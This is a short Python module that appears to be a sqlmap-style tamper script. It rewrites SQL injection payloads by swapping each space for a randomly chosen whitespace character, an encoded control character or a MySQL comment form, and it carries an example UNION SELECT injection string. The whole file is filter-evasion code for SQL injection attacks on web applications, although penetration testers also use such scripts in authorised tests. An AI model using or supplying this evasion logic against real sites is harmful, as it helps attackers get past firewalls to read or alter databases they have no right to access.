import random

__example_payload__ = "' UNION SELECT NULL,NULL FROM DUAL--"
__type__ = "replacing spaces with various whitespace and comment alternatives"


def tamper(payload, **kwargs):
    space_variants = [
        "/**/", "%09", "%0a", "%0d", "%0b", "%0c",
        "%00", "\t", "\n", "\r", "\v", "\f",
        "/*!*/", "/**_**/", "/*!50000*/"
    ]
    if payload:
        retval = ""
        for char in payload:
            if char == " ":
                retval += random.choice(space_variants)
            else:
                retval += char
        return retval
    return payload
